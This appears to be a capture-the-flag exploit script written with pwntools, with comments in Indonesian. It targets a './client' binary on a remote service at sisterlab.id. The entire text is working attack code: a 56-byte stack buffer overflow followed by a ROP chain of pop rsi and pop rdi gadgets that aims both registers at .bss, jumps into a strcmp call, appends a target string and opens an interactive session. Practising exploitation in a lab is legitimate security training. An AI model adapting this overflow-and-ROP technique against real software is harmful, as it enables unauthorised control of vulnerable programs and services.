from pwn import *

context.binary = './client'
context.log_level = 'debug'
elf = context.binary
io = remote("sisterlab.id", 42003)

offset = 56
pop_rsi = 0x401188
pop_rdi = 0x401186
bss = elf.bss() + 0x20
call_strcmp = 0x40119d  # langsung ke call strcmp (skip lea)

target_string = b"level 5 gyatt rizz\x00"

# Payload: set rsi & rdi ke .bss (berisi string kamu)
payload  = b"A" * offset
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(call_strcmp)

# Tambahkan string ke payload agar ditulis ke .bss
payload += b"B" * (300 - len(payload))
payload += target_string

# Jalankan
io.sendlineafter(b'> ', payload)
io.interactive()